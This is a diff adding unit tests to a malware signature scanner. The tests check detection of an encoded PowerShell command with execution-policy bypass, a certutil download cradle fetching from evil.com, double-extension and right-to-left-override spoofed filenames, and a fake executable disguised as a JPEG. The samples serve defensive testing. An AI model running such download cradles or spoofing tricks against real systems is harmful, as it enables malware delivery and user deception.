@@ -46,6 +46,36 @@ def test_signature_engine_rules():
     clean_matches = engine.scan_content(b"Hello world! This is a benign text file.")
     assert len(clean_matches) == 0
 
+    # 5. Encoded PowerShell
+    ps_enc = b"powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=="
+    enc_matches = engine.scan_content(ps_enc)
+    assert any(m[0] == "PowerShell_Encoded_Command" for m in enc_matches)
+
+    # 6. CertUtil download cradle
+    certutil_content = b"certutil -urlcache -split -f http://evil.com/payload.exe payload.exe"
+    cu_matches = engine.scan_content(certutil_content)
+    assert any(m[0] == "CertUtil_Download_Cradle" for m in cu_matches)
+
+    # 7. Double extension masquerade
+    de_matches = engine.scan_content(b"dummy", filename="Corporate_Report.pdf.exe")
+    assert any(m[0] == "Double_Extension_Masquerade" for m in de_matches)
+
+    # 8. RTLO character spoofing
+    rtlo_name = "Invoice_2026\u202Efdp.exe"
+    rtlo_matches = engine.scan_content(b"dummy", filename=rtlo_name)
+    assert any(m[0] == "RTLO_Character_Spoof" for m in rtlo_matches)
+
+
+def test_disguised_pe_executable(tmp_path: Path):
+    engine = SignatureEngine()
+    fake_image = tmp_path / "avatar.jpg"
+    # Create fake PE file (MZ header at offset 0, valid size)
+    pe_header = b"MZ" + b"\x00" * 58 + b"\x80\x00\x00\x00" + b"\x00" * 68 + b"PE\x00\x00" + b"\x00" * 100
+    fake_image.write_bytes(pe_header)
+
+    flags = engine.scan_file(fake_image, sha256="abc123")
+    assert "yara:Disguised_PE_Executable" in flags
+
 
 def test_scenario_2_infected_drive_scan(tmp_path: Path):
     # Scenario 2 from proposal:
